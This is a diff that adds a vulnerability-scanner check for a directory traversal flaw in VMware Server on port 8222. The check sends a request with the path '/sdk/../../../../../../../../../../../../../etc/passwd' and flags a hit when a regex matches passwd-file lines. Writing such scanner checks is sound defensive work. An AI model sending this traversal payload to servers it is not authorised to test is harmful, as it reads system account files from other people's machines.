@@ -1,0 +1,80 @@
+#include helpers.inc;
+{
+	function classMatches()
+	{
+		this.plainArray = [];
+		this.regexArray = [];							
+	}
+	
+	classMatches.prototype.searchOnText = function(text) 
+	{
+		// search plain texts first
+		for (var i=0;i<this.plainArray.length;i++) 
+		{
+			if (text.indexOf(this.plainArray[i]) != -1) 
+				return this.plainArray[i];
+		}
+			
+		// search regexes
+		for (var i=0;i<this.regexArray.length;i++) 
+		{
+			var m = this.regexArray[i].exec(text);
+			if (m) return m[0];
+		}						
+		return false;	
+	}
+}
+// **************************************************************************************							 
+function alert(job, fname)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(job);	
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************
+function TestForDirectoryTraversal(matches, job)
+{
+	var res = null;
+	
+		matches.plainArray = [
+						  ];
+		
+		matches.regexArray = [
+							/((\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3})/,
+						  ];	
+	
+	var matchedText = matches.searchOnText(job.response.body);	
+	if (matchedText) { alert(job, "Directory_traversal_vulnerability_in_VMware_Server.xml"); res = 1; }
+	
+	return res;
+}
+// **************************************************************************************							 
+function request(uri)
+{
+	var http = new THTTPJob();
+		
+	http.setStrURL('http://' + scanHost + ':8222/');
+	http.verb = 'GET';
+	http.URI = uri;
+	http.execute();	
+	if (!http.wasError)
+	{
+		return TestForDirectoryTraversal(matches, http);
+	}	
+}
+// **************************************************************************************	
+function startTesting()
+{
+	if (request('/sdk/../../../../../../../../../../../../../etc/passwd')) return;	
+}
+/***********************************************************************************/
+/* main entry point */
+if (IsPortOpen(8222))
+{
+	var matches = new classMatches();
+	startTesting();
+}
